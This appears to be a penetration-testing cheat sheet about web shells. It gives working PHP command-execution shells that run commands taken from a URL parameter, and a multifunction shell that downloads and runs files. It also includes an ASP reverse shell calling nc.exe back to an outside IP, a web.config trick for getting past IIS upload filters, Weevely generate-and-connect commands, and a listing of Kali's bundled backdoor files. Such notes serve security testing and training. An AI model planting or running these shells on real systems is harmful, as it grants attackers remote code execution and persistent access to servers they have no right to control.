# Web Shells

## WebShells

WebShells are simply shells that the user can interact with on a web interface, however, we can build our own malicious shells to gain remote code execution or access to the target system.

### PHP WebShells

We can use some built-in functions to execute a shell, however, you may want to [read this](https://stackoverflow.com/questions/1924939/among-request-get-and-post-which-one-is-the-fastest) first if you're not sure which request method to use.

Basically:

* You should use the method `$_GET` when someone is requesting data **from** the application.
* You should use the method `$_POST` when someone is pushing _(inserting or updating ; or deleting)_ data **to** the application.

In order for these functions to work, they must be enabled in the `php.ini` configuration file.

The most common of the executions via PHP that we can configure is the following:

```php
<?php
    system('whoami');
?>
```

system():

```php
<?php echo system($_GET['cmd']);?>
```

shell\_exec():

```php
<?php echo shell_exec($_GET['cmd']);?>
```

exec():

```php
<?php echo exec($_GET['cmd']);?>
```

passthru():&#x20;

```php
<?php echo passthru($_GET['cmd']);?>
```

From any of the functions above, we can request the following URL:

* http://10.10.10.10/filename.php?cmd=whoami

When executing certain commands such as `ps -faux`, or a simple `cat / etc / passwd`, you can see how the output shown via the web has an unpleasant aspect to read. We can fix this by adding some preformatting tags to our script:

```php
<?php
    echo "<pre>" . system($_GET['cmd']) . "</pre>";
?>
```

Alternatively, we can use different functions like `shell_exec`:

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

In case we want to make it **multifunctional** , we can manage the variable provided by the user who makes the request, where for the case presented below, in addition to executing commands through the variable `fexec`, we create a new variable `fupload` to transfer files from our local machine to the remote machine in the working directory:

```php
<?php
    if(isset($_REQUEST['fexec'])){
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };

    if(isset($_REQUEST['fupload'])){
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://127.0.0.1:8000/" . $_REQUEST['fupload']));
    };
?>
```

In this way, the user who makes the queries could carry out any of the following 3 operations:

* http://10.10.10.10/filename.php?fexec=whoami
* http://10.10.10.10/filename.php?fupload=filename.php
* http://10.10.10.10/filename.php?fupload=filename.php\&fexec=php+filename.php

Alternatively, we can upload and execute the file with:

```php
# Upload
if (isset($_GET['fupload'])) {
    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
};
# Execute code
# shell_exec() or system() or exec()
if (isset($_GET['cmd'])) {
    echo "<pre>" . exec($_GET['cmd']) . "</pre>";
};
?>
```

### ASP/ASPX WebShells

If the web application has the ability to upload files then we may be able to upload reverse shells:

```aspnet
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
%>
```

#### Bypass File Uploads Restrictions

The web.config file plays an important role in storing IIS7 (and higher) settings. It is very similar to a .htaccess file in the Apache webserver. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique. Some interesting examples of this technique are accessible via the following GitHub repository: [https://github.com/KCSEC/htshells](https://github.com/KCSEC/htshells)

In IIS7 (and higher), it is possible to do similar tricks by uploading or making a web.config file. A few of these tricks might even be applicable to IIS6 with some minor changes. The techniques below show some different web.config files that can be used to bypass protections around the file uploaders.

#### Running web.config as an ASP file <a href="#running-webconfig-as-an-asp-file" id="running-webconfig-as-an-asp-file"></a>

Sometimes IIS supports ASP files but it is not possible to upload any file with .ASP extension. In this case, it is possible to use a web.config file directly to run ASP classic codes:

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

This text was extracted from:

{% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" %}

## Weevely

Using weevely we can create php webshells easily.

```
weevely generate password /root/webshell.php
```

Not we execute it and get a shell in return:

```
weevely "http://ip/webshell.php" password
```

## SecLists Shells

[SecLists](https://github.com/danielmiessler/SecLists) is an awesome collection of wordlists, it also includes webshells:

```
SecLists/Web-Shells/
```

## Kali Linux Built-In WebShells

Kali Linux comes with some webshells in `asp, aspx, cfm, jsp, perl and php`which are under `/usr/share/webshells`:

```
/usr/share/webshells/asp:
cmd-asp-5.1.asp
cmdasp.asp

/usr/share/webshells/aspx:
cmdasp.aspx

/usr/share/webshells/cfm:
cfexec.cfm

/usr/share/webshells/jsp:
cmdjsp.jsp
jsp-reverse.jsp

/usr/share/webshells/laudanum:
asp
aspx
cfm
helpers
jsp
php
wordpress
README

/usr/share/webshells/laudanum/asp:
dns.asp
file.asp
proxy.asp
shell.asp

/usr/share/webshells/laudanum/aspx:
shell.aspx

/usr/share/webshells/laudanum/cfm:
application.cfc
shell.cfm

/usr/share/webshells/laudanum/helpers:
shell.py

/usr/share/webshells/laudanum/jsp:
warfiles
cmd.war
makewar.sh

/usr/share/webshells/laudanum/jsp/warfiles:
META-INF
WEB-INF
cmd.jsp

/usr/share/webshells/laudanum/jsp/warfiles/META-INF:
MANIFEST.MF

/usr/share/webshells/laudanum/jsp/warfiles/WEB-INF:
web.xml

/usr/share/webshells/laudanum/php:
dns.php
file.php
hidden.php
host.php
killnc.php
php-reverse-shell.php
proxy.php
shell.php

/usr/share/webshells/laudanum/wordpress:
templates
laudanum.php

/usr/share/webshells/laudanum/wordpress/templates:
dns.php
file.php
host.php
ipcheck.php
killnc.php
php-reverse-shell.php
proxy.php
settings.php
shell.php

/usr/share/webshells/perl:
perl-reverse-shell.pl
perlcmd.cgi

/usr/share/webshells/php:
findsocket
php-backdoor.php
php-reverse-shell.php
qsd-php-backdoor.php
simple-backdoor.php

/usr/share/webshells/php/findsocket:
findsock.c
php-findsock-shell.php
```



